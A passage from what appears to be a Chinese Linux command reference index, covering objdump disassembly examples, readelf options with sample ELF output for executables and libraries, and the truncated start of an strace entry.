.comment \n00000000 g     F .text  0000000c printTest() \n00000000         *UND*  00000000 __gxx_personality_v0 \n0000000c g     F .text  00000013 printTest2() \n```\n\n这里，和没-C相比，printTest2函数可读性增加了。 \n\n **反汇编目标文件的特定机器码段： ** \n\n```shell\n[root@localhost test]# objdump -d mytest.o \nmytest.o:     file format elf32-i386 \nDisassembly of section .text: \n\n00000000 <_Z9printTestv>: \n   0:   55                      push   %ebp \n   1:   89 e5                   mov    %esp,%ebp \n   3:   83 ec 10                sub    $0x10,%esp \n   6:   c6 45 ff 61             movb   $0x61,0xffffffff(%ebp) \n   a:   c9                      leave  \n  b:   c3                      ret    \n\n0000000c <_Z10printTest2v>: \n   c:   55                      push   %ebp \n   d:   89 e5                   mov    %esp,%ebp \n   f:   83 ec 10                sub    $0x10,%esp \n  12:   c7 45 fc 02 00 00 00    movl   $0x2,0xfffffffc(%ebp) \n  19:   83 45 fc 02             addl   $0x2,0xfffffffc(%ebp) \n  1d:   c9                      leave  \n  1e:   c3                      ret    \n```\n\n这里，对text段的内容进行了反汇编。 \n\n **反汇编特定段，并将汇编代码对应的文件名称和行号对应上： ** \n\n```shell\n[root@localhost test]# objdump -d -l mytest.o\nmytest.o:     file format elf32-i386 \nDisassembly of section .text: \n\n00000000 <_Z9printTestv>: \n_Z9printTestv(): \n/root/test/04_libraryTest/mytest.cpp:1 \n   0:   55                      push   %ebp \n   1:   89 e5                   mov    %esp,%ebp \n   3:   83 ec 10                sub    $0x10,%esp \n/root/test/04_libraryTest/mytest.cpp:4 \n   6:   c6 45 ff 61             movb   $0x61,0xffffffff(%ebp) \n/root/test/04_libraryTest/mytest.cpp:5 \n   a:   c9                      leave  \n   b:   c3                      ret    \n\n0000000c <_Z10printTest2v>: \n_Z10printTest2v(): \n/root/test/04_libraryTest/mytest.cpp:6 \n   c:   55                      push   %ebp \n   d:   89 e5                   mov    %esp,%ebp \n   f:   83 ec 10                sub    $0x10,%esp \n/root/test/04_libraryTest/mytest.cpp:8 \n  12:   c7 45 fc 02 00 00 00    movl   $0x2,0xfffffffc(%ebp) \n/root/test/04_libraryTest/mytest.cpp:9 \n  19:   83 45 fc 02             addl   $0x2,0xfffffffc(%ebp) \n/root/test/04_libraryTest/mytest.cpp:10 \n  1d:   c9                      leave  \n  1e:   c3                      ret    \n```\n\n这里，项\"-d\"从objfile中反汇编那些特定指令机器码的section，而使用\"-l\"指定用文件名和行号标注相应的目标代码，仅仅和-d、-D或者-r一起使用，使用-ld和使用-d的区别不是很大，在源码级调试的时候有用，要求编译时使用了-g之类的调试编译选项。 \n\n **显示目标文件各个段的头部摘要信息： ** \n\n```shell\n[root@localhost test]# objdump -h mytest.o \nmytest.o:     file format elf32-i386 \n\nSections: \nIdx Name          Size      VMA       LMA       File off  Algn \n  0 .text         0000001f  00000000  00000000  00000034  2**2 \n                  CONTENTS, ALLOC, LOAD, readonly, CODE \n  1 .data         00000000  00000000  00000000  00000054  2**2 \n                  CONTENTS, ALLOC, LOAD, DATA \n  2 .bss          00000000  00000000  00000000  00000054  2**2 \n                  ALLOC \n  3 .debug_abbrev 00000046  00000000  00000000  00000054  2**0 \n                  CONTENTS, READONLY, DEBUGGING \n  4 .debug_info   000000ed  00000000  00000000  0000009a  2**0 \n                  CONTENTS, RELOC, READONLY, DEBUGGING \n  5 .debug_line   0000003e  00000000  00000000  00000187  2**0 \n                  CONTENTS, RELOC, READONLY, DEBUGGING \n  6 .debug_frame  00000044  00000000  00000000  000001c8  2**2 \n                  CONTENTS, RELOC, READONLY, DEBUGGING \n  7 .debug_loc    00000058  00000000  00000000  0000020c  2**0 \n                  CONTENTS, READONLY, DEBUGGING \n  8 .debug_pubnames 0000002f  00000000  00000000  00000264  2**0 \n                  CONTENTS, RELOC, READONLY, DEBUGGING \n  9 .debug_aranges 00000020  00000000  00000000  00000293  2**0 \n                  CONTENTS, RELOC, READONLY, DEBUGGING \n10 .comment      0000002e  00000000  00000000  000002b3  2**0 \n                  CONTENTS, READONLY \n11 .note.GNU-stack 00000000  00000000  00000000  000002e1  2**0 \n                  CONTENTS, READONLY \n```\n\n这里，更多的内容参见`man objdump`中的这个选项。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","objdump"]},{"title":"【Linux 命令】readelf","url":"/linux-command/readelf/","content":"\n用于显示elf格式文件的信息\n\n## 补充说明\n\n**readelf命令** 用来显示一个或者多个elf格式的目标文件的信息，可以通过它的选项来控制显示哪些信息。这里的elf-file(s)就表示那些被检查的文件。可以支持32位，64位的elf格式文件，也支持包含elf文件的文档（这里一般指的是使用ar命令将一些elf文件打包之后生成的例如lib*.a之类的“静态库”文件）。 \n\n这个程序和objdump提供的功能类似，但是它显示的信息更为具体，并且它不依赖BFD库(BFD库是一个GNU项目，它的目标就是希望通过一种统一的接口来处理不同的目标文件)，所以即使BFD库有什么bug存在的话也不会影响到readelf程序。 \n\n运行readelf的时候，除了-v和-H之外，其它的选项必须有一个被指定。 \n\n###  ELF文件类型\n\n **种类型的ELF文件：** \n\n1.  可重定位文件:用户和其他目标文件一起创建可执行文件或者共享目标文件,例如lib*.a文件。 \n2.  可执行文件：用于生成进程映像，载入内存执行,例如编译好的可执行文件a.out。 \n3.  共享目标文件：用于和其他共享目标文件或者可重定位文件一起生成elf目标文件或者和执行文件一起创建进程映像，例如lib*.so文件。 \n\n **ELF文件作用：** \n\nELF文件参与程序的连接(建立一个程序)和程序的执行(运行一个程序)，所以可以从不同的角度来看待elf格式的文件： \n\n1.  如果用于编译和链接（可重定位文件），则编译器和链接器将把elf文件看作是节头表描述的节的集合,程序头表可选。 \n2.  如果用于加载执行（可执行文件），则加载器则将把elf文件看作是程序头表描述的段的集合，一个段可能包含多个节，节头表可选。 \n3.  如果是共享文件，则两者都含有。 \n\n **ELF文件总体组成：**  \n\nelf文件头描述elf文件的总体信息。包括：系统相关，类型相关，加载相关，链接相关。 \n\n*   系统相关表示：elf文件标识的魔术数，以及硬件和平台等相关信息，增加了elf文件的移植性,使交叉编译成为可能。 \n*   类型相关就是前面说的那个类型。 \n*   加载相关：包括程序头表相关信息。 \n*   链接相关：节头表相关信息。 \n\n###  选项\n\n```shell\n-a \n--all 显示全部信息,等价于 -h -l -S -s -r -d -V -A -I. \n\n-h \n--file-header 显示elf文件开始的文件头信息. \n\n-l \n--program-headers  \n--segments 显示程序头（段头）信息(如果有的话)。 \n\n-S \n--section-headers  \n--sections 显示节头信息(如果有的话)。 \n\n-g \n--section-groups 显示节组信息(如果有的话)。 \n\n-t \n--section-details 显示节的详细信息(-S的)。 \n\n-s \n--syms        \n--symbols 显示符号表段中的项（如果有的话）。 \n\n-e \n--headers 显示全部头信息，等价于: -h -l -S \n\n-n \n--notes 显示note段（内核注释）的信息。 \n\n-r \n--relocs 显示可重定位段的信息。 \n\n-u \n--unwind 显示unwind段信息。当前只支持IA64 ELF的unwind段信息。 \n\n-d \n--dynamic 显示动态段的信息。 \n\n-V \n--version-info 显示版本段的信息。 \n\n-A \n--arch-specific 显示CPU构架信息。 \n\n-D \n--use-dynamic 使用动态段中的符号表显示符号，而不是使用符号段。 \n\n-x <number or name> \n--hex-dump=<number or name> 以16进制方式显示指定段内内容。number指定段表中段的索引,或字符串指定文件中的段名。 \n\n-w[liaprmfFsoR] or \n--debug-dump[=line,=info,=abbrev,=pubnames,=aranges,=macro,=frames,=frames-interp,=str,=loc,=Ranges] 显示调试段中指定的内容。 \n\n-I \n--histogram 显示符号的时候，显示bucket list长度的柱状图。 \n\n-v \n--version 显示readelf的版本信息。 \n\n-H \n--help 显示readelf所支持的命令行选项。 \n\n-W \n--wide 宽行输出。 \n\n@file 可以将选项集中到一个文件中，然后使用这个@file选项载入。 \n```\n\n###  实例\n\n先给出如下例子：\n\n **1.对于可执行文件形式的elf格式文件：** \n\n1)查看可执行程序的源代码如下： \n\n```shell\nroot@localhost [test]$ cat main.cpp \n#include <iostream> \nusing std::cout; \nusing std::endl; \nvoid my_print(); \n\nint main(int argc, char *argv[]) \n{ \n        my_print(); \n        cout<<\"hello!\"<<endl; \n        return 0; \n} \n\nvoid  my_print() \n{ \n        cout<<\"print!\"<<endl; \n} \n```\n\n2)编译如下： \n\n```shell\n[root@localhost test]$ g++ main.cpp -o main \n[root@localhost test]$ g++ -g main.cpp -o main.debug \n```\n\n3)编译之后，查看生成的文件： \n\n```shell\n[root@localhost test]$ ls -l \n总计 64 \n-rwxr-xr-x 1 quietheart quietheart  6700 07-07 18:04 main \n-rw-r--r-- 1 quietheart quietheart   201 07-07 18:02 main.cpp \n-rwxr-xr-x 1 quietheart quietheart 38932 07-07 18:04 main.debug \n```\n\n这里，main.debug是带有调试信息的可执行文件，main是一般的可执行文件。 \n\n **2.对于库文件形式的elf格式文件：** \n\n1)查看库的源代码如下： \n\n```shell\n//myfile.h \n#ifndef __MYFILE_H \n#define __MYFILE_H \nvoid printInfo(); \n#endif \n\n//myfile.cpp \n#include \"myfile.h\" \n#include <iostream> \nusing std::cout; \nusing std::endl; \nvoid printInfo() \n{ \n    cout<<\"hello\"<<endl; \n} \n```\n\n2)编译如下： \n\n```shell\n[root@localhost test]$ g++ -c myfile.cpp \n[root@localhost test]$ g++ -shared -fPCI -o libmy.so myfile.o \n[root@localhost test]$ ar -r libmy.a myfile.o \nar: creating libmy.a \n```\n\n3)编译之后，查看生成的文件： \n\n[root@localhost test]$ ls -l \n\n总计 44 \n\n```shell\n-rw-r--r-- 1 quietheart quietheart 2154 07-08 16:14 libmy.a \n-rwxr-xr-x 1 quietheart quietheart 5707 07-08 16:08 libmy.so \n-rwxr-xr-x 1 quietheart quietheart  117 07-08 16:06 myfile.cpp \n-rwxr-xr-x 1 quietheart quietheart   63 07-08 16:08 myfile.h \n-rw-r--r-- 1 quietheart quietheart 2004 07-08 16:08 myfile.o \nlibmy.a  libmy.so  myfile.cpp  myfile.h  myfile.o \n```\n\n这里，分别生成目标文件myfile.o，共享库文件libmy.so，和静态库文件libmy.a。 \n\n基于以上可执行文件和库，这里给出一些常用的命令。 \n\n **读取可执行文件形式的elf文件头信息：** \n\n```shell\n[root@localhost test]$ readelf -h main \nELF Header: \n  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 \n  Class:                             ELF32 \n  Data:                              2's complement, little endian \n  Version:                           1 (current) \n  OS/ABI:                            UNIX - System V \n  ABI Version:                       0 \n  type:                              exec (Executable file) \n  Machine:                           Intel 80386 \n  Version:                           0x1 \n  Entry point address:               0x8048580 \n  Start of program headers:          52 (bytes into file) \n  Start of section headers:          3232 (bytes into file) \n  Flags:                             0x0 \n  Size of this header:               52 (bytes) \n  Size of program headers:           32 (bytes) \n  Number of program headers:         8 \n  Size of section headers:           40 (bytes) \n  Number of section headers:         29 \n  Section header string table index: 26 \n```\n\n这里，可见可执行文件的elf文件，其类型为EXEC(可执行文件)。另外，含调试信息的\"main.debug\"和不含调试信息的\"main\"除了一些大小信息之外，其内容是一样的。并且由此可见文件的体系结构为Intel 80386。 \n\n **读取目标文件形式的elf文件头信息：** \n\n```shell\n[root@localhost test]$ readelf -h myfile.o \nELF Header: \n  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 \n  Class:                             ELF32 \n  Data:                              2's complement, little endian \n  Version:                           1 (current) \n  OS/ABI:                            UNIX - System V \n  ABI Version:                       0 \n  Type:                              REL (Relocatable file) \n  Machine:                           Intel 80386 \n  Version:                           0x1 \n  Entry point address:               0x0 \n  Start of program headers:          0 (bytes into file) \n  Start of section headers:          516 (bytes into file) \n  Flags:                             0x0 \n  Size of this header:               52 (bytes) \n  Size of program headers:           0 (bytes) \n  Number of program headers:         0 \n  Size of section headers:           40 (bytes) \n  Number of section headers:         15 \n  Section header string table index: 12 \n```\n\n这里，可见目标文件的elf文件，其类型为REL(可重定位文件)。 \n\n **读取静态库文件形式的elf文件头信息：** \n\n```shell\n[root@localhost test]$ readelf -h libmy.a \nFile: libmy.a(myfile.o) \nELF Header: \n  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 \n  Class:                             ELF32 \n  Data:                              2's complement, little endian \n  Version:                           1 (current) \n  OS/ABI:                            UNIX - System V \n  ABI Version:                       0 \n  Type:                              REL (Relocatable file) \n  Machine:                           Intel 80386 \n  Version:                           0x1 \n  Entry point address:               0x0 \n  Start of program headers:          0 (bytes into file) \n  Start of section headers:          516 (bytes into file) \n  Flags:                             0x0 \n  Size of this header:               52 (bytes) \n  Size of program headers:           0 (bytes) \n  Number of program headers:         0 \n  Size of section headers:           40 (bytes) \n  Number of section headers:         15 \n  Section header string table index: 12 \n```\n\n这里，可见静态库文件的elf文件，其类型为REL(可重定位文件)。 \n\n **读取动态库文件形式的elf文件头信息：** \n\n```shell\n[root@localhost test]$ readelf -h libmy.so \nELF Header: \n  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 \n  Class:                             ELF32 \n  Data:                              2's complement, little endian \n  Version:                           1 (current) \n  OS/ABI:                            UNIX - System V \n  ABI Version:                       0 \n  Type:                              DYN (Shared object file) \n  Machine:                           Intel 80386 \n  Version:                           0x1 \n  Entry point address:               0x550 \n  Start of program headers:          52 (bytes into file) \n  Start of section headers:          2768 (bytes into file) \n  Flags:                             0x0 \n  Size of this header:               52 (bytes) \n  Size of program headers:           32 (bytes) \n  Number of program headers:         5 \n  Size of section headers:           40 (bytes) \n  Number of section headers:         27 \n  Section header string table index: 24 \n```\n\n这里，可见动态库文件的elf文件，其类型为DYN(共享目标文件)。 \n\n **查看可执行的elf文件程序头表信息：** \n\n```shell\n[root@localhost test]$ readelf -l main \nElf file type is EXEC (Executable file) \nEntry point 0x8048580 \nThere are 8 program headers, starting at offset 52 \n\nProgram Headers: \n  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align \n  PHDR           0x000034 0x08048034 0x08048034 0x00100 0x00100 R E 0x4 \n  INTERP         0x000134 0x08048134 0x08048134 0x00013 0x00013 R   0x1 \n      Requesting program interpreter: /lib/[ld-linux.so.2] \n  LOAD           0x000000 0x08048000 0x08048000 0x00970 0x00970 R E 0x1000 \n  LOAD           0x000970 0x08049970 0x08049970 0x00130 0x001c8 RW  0x1000 \n  DYNAMIC        0x000988 0x08049988 0x08049988 0x000e0 0x000e0 RW  0x4 \n  NOTE           0x000148 0x08048148 0x08048148 0x00020 0x00020 R   0x4 \n  GNU_EH_FRAME   0x000820 0x08048820 0x08048820 0x00044 0x00044 R   0x4 \n  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4 \n\nSection to Segment mapping: \n  Segment Sections... \n   00     \n   01     .interp \n   02     .interp .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .text .fini .rodata .eh_frame_hdr .eh_frame \n   03     .ctors .dtors .jcr .dynamic .got .got.plt .data .bss \n   04     .dynamic \n   05     .note.ABI-tag \n   06     .eh_frame_hdr \n   07     \n```\n\n这里，含调试信息的\"main.debug\"和不含调试信息的\"main\"其内容是一样的。 \n\n **查看目标文件的elf文件程序头表信息： ** \n\n```shell\n[root@localhost test]$ readelf -l myfile.o \nThere are no program headers in this file. \n```\n\n这里可知，可重定位的目标文件，它没程序头表。 \n\n **查看静态库文件的elf文件程序头表信息：** \n\n```shell\n[root@localhost test]$ readelf -l libmy.a \nFile: libmy.a(myfile.o) \nThere are no program headers in this file. \n```\n\n这里可知，可重定位的静态库文件，它没程序头表。 \n\n **查看动态库文件的elf文件程序头表信息：** \n\n```shell\n[root@localhost test]$ readelf -l libmy.so \nElf file type is DYN (Shared object file) \nEntry point 0x550 \nThere are 5 program headers, starting at offset 52 \n\nProgram Headers: \n  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align \n  LOAD           0x000000 0x00000000 0x00000000 0x007f4 0x007f4 R E 0x1000 \n  LOAD           0x0007f4 0x000017f4 0x000017f4 0x0011c 0x00128 RW  0x1000 \n  DYNAMIC        0x000810 0x00001810 0x00001810 0x000e0 0x000e0 RW  0x4 \n  GNU_EH_FRAME   0x000738 0x00000738 0x00000738 0x0002c 0x0002c R   0x4 \n  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4 \n\nSection to Segment mapping: \n  Segment Sections... \n   00     .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .text .fini .rodata .eh_frame_hdr .eh_frame \n   01     .ctors .dtors .jcr .data.rel.ro .dynamic .got .got.plt .bss \n   02     .dynamic \n   03     .eh_frame_hdr \n   04     \n```\n\n这里可知，做为共享目标文件的动态库，它程序头表。 \n\n **查看一个可执行的elf文件的节信息：** \n\n```shell\n[root@localhost test]$ readelf -S main \nThere are 29 section headers, starting at offset 0xca0: \nSection Headers: \n  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al \n  [ 0]                   NULL            00000000 000000 000000 00      0   0  0 \n  [ 1] .interp           PROGBITS        08048134 000134 000013 00   A  0   0  1 \n  [ 2] .note.ABI-tag     NOTE            08048148 000148 000020 00   A  0   0  4 \n  [ 3] .gnu.hash         GNU_HASH        08048168 000168 000030 04   A  4   0  4 \n  [ 4] .dynsym           DYNSYM          08048198 000198 0000d0 10   A  5   1  4 \n  [ 5] .dynstr           STRTAB          08048268 000268 000183 00   A  0   0  1 \n  [ 6] .gnu.version      VERSYM          080483ec 0003ec 00001a 02   A  4   0  2 \n  [ 7] .gnu.version_r    VERNEED         08048408 000408 000060 00   A  5   2  4 \n  [ 8] .rel.dyn          REL             08048468 000468 000010 08   A  4   0  4 \n  [ 9] .rel.plt          REL             08048478 000478 000048 08   A  4  11  4 \n  [10] .init             PROGBITS        080484c0 0004c0 000017 00  AX  0   0  4 \n  [11] .plt              PROGBITS        080484d8 0004d8 0000a0 04  AX  0   0  4 \n  [12] .text             PROGBITS        08048580 000580 000268 00  AX  0   0 16 \n  [13] .fini             PROGBITS        080487e8 0007e8 00001c 00  AX  0   0  4 \n  [14] .rodata           PROGBITS        08048804 000804 00001a 00   A  0   0  4 \n  [15] .eh_frame_hdr     PROGBITS        08048820 000820 000044 00   A  0   0  4 \n  [16] .eh_frame         PROGBITS        08048864 000864 00010c 00   A  0   0  4 \n  [17] .ctors            PROGBITS        08049970 000970 00000c 00  WA  0   0  4 \n  [18] .dtors            PROGBITS        0804997c 00097c 000008 00  WA  0   0  4 \n  [19] .jcr              PROGBITS        08049984 000984 000004 00  WA  0   0  4 \n  [20] .dynamic          DYNAMIC         08049988 000988 0000e0 08  WA  5   0  4 \n  [21] .got              PROGBITS        08049a68 000a68 000004 04  WA  0   0  4 \n  [22] .got.plt          PROGBITS        08049a6c 000a6c 000030 04  WA  0   0  4 \n  [23] .data             PROGBITS        08049a9c 000a9c 000004 00  WA  0   0  4 \n  [24] .bss              NOBITS          08049aa0 000aa0 000098 00  WA  0   0  8 \n  [25] .comment          PROGBITS        00000000 000aa0 000114 00      0   0  1 \n  [26] .shstrtab         STRTAB          00000000 000bb4 0000e9 00      0   0  1 \n  [27] .symtab           SYMTAB          00000000 001128 000510 10     28  53  4 \n  [28] .strtab           STRTAB          00000000 001638 0003f4 00      0   0  1 \nKey to Flags: \n  W (write), A (alloc), X (execute), M (merge), S (strings) \n  I (info), L (link order), G (group), x (unknown) \n  O (extra OS processing required) o (OS specific), p (processor specific) \n```\n\n这里，main是可执行文件，不含调试信息。 \n\n **查看一个包含调试信息的可执行的elf文件的节信息：** \n\n```shell\n[root@localhost test]$ readelf -S main.debug \nThere are 37 section headers, starting at offset 0x88c8: \n\nSection Headers: \n  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al \n  [ 0]                   NULL            00000000 000000 000000 00      0   0  0 \n  [ 1] .interp           PROGBITS        08048134 000134 000013 00   A  0   0  1 \n  [ 2] .note.ABI-tag     NOTE            08048148 000148 000020 00   A  0   0  4 \n  [ 3] .gnu.hash         GNU_HASH        08048168 000168 000030 04   A  4   0  4 \n  [ 4] .dynsym           DYNSYM          08048198 000198 0000d0 10   A  5   1  4 \n  [ 5] .dynstr           STRTAB          08048268 000268 000183 00   A  0   0  1 \n  [ 6] .gnu.version      VERSYM          080483ec 0003ec 00001a 02   A  4   0  2 \n  [ 7] .gnu.version_r    VERNEED         08048408 000408 000060 00   A  5   2  4 \n  [ 8] .rel.dyn          REL             08048468 000468 000010 08   A  4   0  4 \n  [ 9] .rel.plt          REL             08048478 000478 000048 08   A  4  11  4 \n  [10] .init             PROGBITS        080484c0 0004c0 000017 00  AX  0   0  4 \n  [11] .plt              PROGBITS        080484d8 0004d8 0000a0 04  AX  0   0  4 \n  [12] .text             PROGBITS        08048580 000580 000268 00  AX  0   0 16 \n  [13] .fini             PROGBITS        080487e8 0007e8 00001c 00  AX  0   0  4 \n  [14] .rodata           PROGBITS        08048804 000804 00001a 00   A  0   0  4 \n  [15] .eh_frame_hdr     PROGBITS        08048820 000820 000044 00   A  0   0  4 \n  [16] .eh_frame         PROGBITS        08048864 000864 00010c 00   A  0   0  4 \n  [17] .ctors            PROGBITS        08049970 000970 00000c 00  WA  0   0  4 \n  [18] .dtors            PROGBITS        0804997c 00097c 000008 00  WA  0   0  4 \n  [19] .jcr              PROGBITS        08049984 000984 000004 00  WA  0   0  4 \n  [20] .dynamic          DYNAMIC         08049988 000988 0000e0 08  WA  5   0  4 \n  [21] .got              PROGBITS        08049a68 000a68 000004 04  WA  0   0  4 \n  [22] .got.plt          PROGBITS        08049a6c 000a6c 000030 04  WA  0   0  4 \n  [23] .data             PROGBITS        08049a9c 000a9c 000004 00  WA  0   0  4 \n  [24] .bss              NOBITS          08049aa0 000aa0 000098 00  WA  0   0  8 \n  [25] .comment          PROGBITS        00000000 000aa0 000114 00      0   0  1 \n  [26] .debug_aranges    PROGBITS        00000000 000bb4 000020 00      0   0  1 \n  [27] .debug_pubnames   PROGBITS        00000000 000bd4 000028 00      0   0  1 \n  [28] .debug_info       PROGBITS        00000000 000bfc 0067aa 00      0   0  1 \n  [29] .debug_abbrev     PROGBITS        00000000 0073a6 000726 00      0   0  1 \n  [30] .debug_line       PROGBITS        00000000 007acc 0003e1 00      0   0  1 \n  [31] .debug_frame      PROGBITS        00000000 007eb0 00009c 00      0   0  4 \n  [32] .debug_str        PROGBITS        00000000 007f4c 000735 00      0   0  1 \n  [33] .debug_loc        PROGBITS        00000000 008681 0000f3 00      0   0  1 \n  [34] .shstrtab         STRTAB          00000000 008774 000151 00      0   0  1 \n  [35] .symtab           SYMTAB          00000000 008e90 000590 10     36  61  4 \n  [36] .strtab           STRTAB          00000000 009420 0003f4 00      0   0  1 \nKey to Flags: \n  W (write), A (alloc), X (execute), M (merge), S (strings) \n  I (info), L (link order), G (group), x (unknown) \n  O (extra OS processing required) o (OS specific), p (processor specific) \n```\n\n可见，相对非调试版本的可执行文件，多了\".debug*\"段的信息。 \n\n **查看一个目标文件的elf文件的节信息：** \n\n```shell\n[root@localhost test]$ readelf -S myfile.o \nThere are 15 section headers, starting at offset 0x204: \n\nSection Headers: \n  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al \n  [ 0]                   NULL            00000000 000000 000000 00      0   0  0 \n  [ 1] .text             PROGBITS        00000000 000034 00009e 00  AX  0   0  4 \n  [ 2] .rel.text         REL             00000000 000744 000060 08     13   1  4 \n  [ 3] .data             PROGBITS        00000000 0000d4 000000 00  WA  0   0  4 \n  [ 4] .bss              NOBITS          00000000 0000d4 000001 00  WA  0   0  4 \n  [ 5] .ctors            PROGBITS        00000000 0000d4 000004 00  WA  0   0  4 \n  [ 6] .rel.ctors        REL             00000000 0007a4 000008 08     13   5  4 \n  [ 7] .rodata           PROGBITS        00000000 0000d8 000006 00   A  0   0  1 \n  [ 8] .eh_frame         PROGBITS        00000000 0000e0 00008c 00   A  0   0  4 \n  [ 9] .rel.eh_frame     REL             00000000 0007ac 000028 08     13   8  4 \n  [10] .comment          PROGBITS        00000000 00016c 00002e 00      0   0  1 \n  [11] .note.GNU-stack   PROGBITS        00000000 00019a 000000 00      0   0  1 \n  [12] .shstrtab         STRTAB          00000000 00019a 00006a 00      0   0  1 \n  [13] .symtab           SYMTAB          00000000 00045c 000180 10     14  14  4 \n  [14] .strtab           STRTAB          00000000 0005dc 000166 00      0   0  1 \nKey to Flags: \n  W (write), A (alloc), X (execute), M (merge), S (strings) \n  I (info), L (link order), G (group), x (unknown) \n  O (extra OS processing required) o (OS specific), p (processor specific) \n\n\n```shell\n\n **查看一个静态库文件的elf文件的节信息：** \n\n```shell\n[root@localhost test]$ readelf -S libmy.a \nFile: libmy.a(myfile.o) \nThere are 15 section headers, starting at offset 0x204: \n\nSection Headers: \n  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al \n  [ 0]                   NULL            00000000 000000 000000 00      0   0  0 \n  [ 1] .text             PROGBITS        00000000 000034 00009e 00  AX  0   0  4 \n  [ 2] .rel.text         REL             00000000 000744 000060 08     13   1  4 \n  [ 3] .data             PROGBITS        00000000 0000d4 000000 00  WA  0   0  4 \n  [ 4] .bss              NOBITS          00000000 0000d4 000001 00  WA  0   0  4 \n  [ 5] .ctors            PROGBITS        00000000 0000d4 000004 00  WA  0   0  4 \n  [ 6] .rel.ctors        REL             00000000 0007a4 000008 08     13   5  4 \n  [ 7] .rodata           PROGBITS        00000000 0000d8 000006 00   A  0   0  1 \n  [ 8] .eh_frame         PROGBITS        00000000 0000e0 00008c 00   A  0   0  4 \n  [ 9] .rel.eh_frame     REL             00000000 0007ac 000028 08     13   8  4 \n  [10] .comment          PROGBITS        00000000 00016c 00002e 00      0   0  1 \n  [11] .note.GNU-stack   PROGBITS        00000000 00019a 000000 00      0   0  1 \n  [12] .shstrtab         STRTAB          00000000 00019a 00006a 00      0   0  1 \n  [13] .symtab           SYMTAB          00000000 00045c 000180 10     14  14  4 \n  [14] .strtab           STRTAB          00000000 0005dc 000166 00      0   0  1 \nKey to Flags: \n  W (write), A (alloc), X (execute), M (merge), S (strings) \n  I (info), L (link order), G (group), x (unknown) \n  O (extra OS processing required) o (OS specific), p (processor specific) \n```\n\n **查看一个动态库文件的elf文件的节信息：** \n\n```shell\n[root@localhost test]$ readelf -S libmy.so \nThere are 27 section headers, starting at offset 0xad0: \n\nSection Headers: \n  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al \n  [ 0]                   NULL            00000000 000000 000000 00      0   0  0 \n  [ 1] .gnu.hash         GNU_HASH        000000d4 0000d4 00003c 04   A  2   0  4 \n  [ 2] .dynsym           DYNSYM          00000110 000110 000120 10   A  3   1  4 \n  [ 3] .dynstr           STRTAB          00000230 000230 000199 00   A  0   0  1 \n  [ 4] .gnu.version      VERSYM          000003ca 0003ca 000024 02   A  2   0  2 \n  [ 5] .gnu.version_r    VERNEED         000003f0 0003f0 000050 00   A  3   2  4 \n  [ 6] .rel.dyn          REL             00000440 000440 0000b0 08   A  2   0  4 \n  [ 7] .rel.plt          REL             000004f0 0004f0 000010 08   A  2   9  4 \n  [ 8] .init             PROGBITS        00000500 000500 000017 00  AX  0   0  4 \n  [ 9] .plt              PROGBITS        00000518 000518 000030 04  AX  0   0  4 \n  [10] .text             PROGBITS        00000550 000550 0001c4 00  AX  0   0 16 \n  [11] .fini             PROGBITS        00000714 000714 00001c 00  AX  0   0  4 \n  [12] .rodata           PROGBITS        00000730 000730 000006 00   A  0   0  1 \n  [13] .eh_frame_hdr     PROGBITS        00000738 000738 00002c 00   A  0   0  4 \n  [14] .eh_frame         PROGBITS        00000764 000764 000090 00   A  0   0  4 \n  [15] .ctors            PROGBITS        000017f4 0007f4 00000c 00  WA  0   0  4 \n  [16] .dtors            PROGBITS        00001800 000800 000008 00  WA  0   0  4 \n  [17] .jcr              PROGBITS        00001808 000808 000004 00  WA  0   0  4 \n  [18] .data.rel.ro      PROGBITS        0000180c 00080c 000004 00  WA  0   0  4 \n  [19] .dynamic          DYNAMIC         00001810 000810 0000e0 08  WA  3   0  4 \n  [20] .got              PROGBITS        000018f0 0008f0 00000c 04  WA  0   0  4 \n  [21] .got.plt          PROGBITS        000018fc 0008fc 000014 04  WA  0   0  4 \n  [22] .bss              NOBITS          00001910 000910 00000c 00  WA  0   0  4 \n  [23] .comment          PROGBITS        00000000 000910 0000e6 00      0   0  1 \n  [24] .shstrtab         STRTAB          00000000 0009f6 0000da 00      0   0  1 \n  [25] .symtab           SYMTAB          00000000 000f08 000410 10     26  48  4 \n  [26] .strtab           STRTAB          00000000 001318 000333 00      0   0  1 \nKey to Flags: \n  W (write), A (alloc), X (execute), M (merge), S (strings) \n  I (info), L (link order), G (group), x (unknown) \n  O (extra OS processing required) o (OS specific), p (processor specific) \n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","readelf"]},{"title":"【Linux 命令】strace","url":"/linux-command/strace/","content":"\n跟踪系统调用和信号\n\n## 补充说明\n\n**strace命令** 是一个集诊断、调试、统计与一体的工具，我们可以使用strace对应用的系统调用和信号传递的跟踪结果来对应用进行分析，以达到解决问题或者是了解应用工作过程的目的。当然strace与专业的调试工具比如说gdb之类的是没法相比的，因为它不是一个专业的调试器。\n\nstrace的最简单的用法就是执行一个指定的命令，在指定的命令结束之后它也就退出了。在命令执行的过程中，strace会记录和解析命令进程的所有系统调用以及这个进程所接收到的所有的信号值。\n\n###  语法\n\n```shell\nstrace  [  -dffhiqrtttTvxx  ] [ -acolumn ] [ -eexpr ] ...\n    [ -ofile ] [-ppid ] ...  [ -sstrsize ] [ -uusername ]\n    [ -Evar=val ] ...  [ -Evar  ]...\n     [command [ arg ...  ] ]\n\nstrace  -c  [ -eexpr ] ...  [ -Ooverhead ] [ 